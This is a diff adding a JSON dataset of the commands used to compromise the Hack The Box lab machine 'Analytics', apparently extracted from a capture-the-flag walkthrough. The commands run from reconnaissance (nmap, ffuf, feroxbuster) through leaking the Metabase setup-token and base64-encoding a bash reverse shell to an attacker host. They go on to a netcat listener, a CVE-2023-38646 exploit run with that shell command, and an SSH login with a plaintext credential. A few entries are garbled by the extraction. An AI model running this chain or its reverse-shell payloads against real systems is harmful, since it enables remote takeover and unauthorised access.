@@ -1,0 +1,116 @@
+{
+  "target_ip": "10.10.11.233",
+  "os": "linux",
+  "steps": [
+    {
+      "phase": "recon",
+      "section": "nmap",
+      "command": "nmap -p- --min-rate 10000 10.10.11.233",
+      "action": "nmap_full",
+      "target_ip": "10.10.11.233"
+    },
+    {
+      "phase": "recon",
+      "section": "nmap",
+      "command": "nmap -p 22,80 -sCV 10.10.11.233Starting Nmap 7.80 ( https://nmap.org ) at 2024-03-14 01:26 EDT",
+      "action": "nmap_scripts",
+      "target_ip": "10.10.11.233"
+    },
+    {
+      "phase": "recon",
+      "section": "Subdomain Fuzz",
+      "command": "ffuf -u http://10.10.11.233 -H \"Host: FUZZ.analytical.htb\" -w /opt/SecLists/Discovery/DNS/subdomains-top1million-20000.txt -mc all -ac",
+      "action": "ffuf",
+      "target_ip": "10.10.11.233"
+    },
+    {
+      "phase": "foothold",
+      "section": "Directory Brute Force",
+      "command": "feroxbuster -u http://analytical.htb",
+      "action": "feroxbuster",
+      "target_ip": "10.10.11.233"
+    },
+    {
+      "phase": "foothold",
+      "section": "Get setup-token",
+      "command": "curl data.analytical.htb/api/session/properties -s | jq '. | keys | .[]' | wc -l",
+      "action": "curl_request",
+      "target_ip": "10.10.11.233"
+    },
+    {
+      "phase": "foothold",
+      "section": "Get setup-token",
+      "command": "curl data.analytical.htb/api/session/properties -s | jq -r '. | keys | .[]' | grep setup-token",
+      "action": "curl_request",
+      "target_ip": "10.10.11.233"
+    },
+    {
+      "phase": "foothold",
+      "section": "Get setup-token",
+      "command": "curl data.analytical.htb/api/session/properties -s | jq -r '.\"setup-token\"'",
+      "action": "curl_request",
+      "target_ip": "10.10.11.233"
+    },
+    {
+      "phase": "foothold",
+      "section": "Generate Payload",
+      "command": "echo 'bash -i >& /dev/tcp/10.10.14.6/443 0>&1' | base64",
+      "action": "unknown",
+      "target_ip": "10.10.14.6"
+    },
+    {
+      "phase": "foothold",
+      "section": "Generate Payload",
+      "command": "echo 'bash  -i >& /dev/tcp/10.10.14.6/443 0>&1' | base64",
+      "action": "unknown",
+      "target_ip": "10.10.14.6"
+    },
+    {
+      "phase": "foothold",
+      "section": "Generate Payload",
+      "command": "echo 'bash  -i >& /dev/tcp/10.10.14.6/443 0>&1 ' | base64",
+      "action": "unknown",
+      "target_ip": "10.10.14.6"
+    },
+    {
+      "phase": "foothold",
+      "section": "Send",
+      "command": "nc -lnvp 443",
+      "action": "netcat",
+      "target_ip": "10.10.11.233"
+    },
+    {
+      "phase": "foothold",
+      "section": "Running",
+      "command": "python cve-2023-38646.py -u http://data.analytical.htb -t 249fa03d-fd94-4d5b-b94f-b4ebf3df681f -c 'bash -i >& /dev/tcp/10.10.14.6/443 0>&1'",
+      "action": "unknown",
+      "target_ip": "10.10.14.6"
+    },
+    {
+      "phase": "user",
+      "section": "SSH",
+      "command": "sshpass -p 'An4lytics_ds20223#' ssh metalytics@analytical.htb",
+      "action": "ssh",
+      "target_ip": "10.10.11.233"
+    },
+    {
+      "phase": "user",
+      "section": "Filesystem",
+      "command": "host",
+      "action": "unknown",
+      "target_ip": "10.10.11.233"
+    }
+  ],
+  "total_commands": 14,
+  "actions_used": [
+    "unknown",
+    "curl_request",
+    "ffuf",
+    "ssh",
+    "netcat",
+    "nmap_scripts",
+    "feroxbuster",
+    "nmap_full"
+  ],
+  "box_name": "analytics"
+}
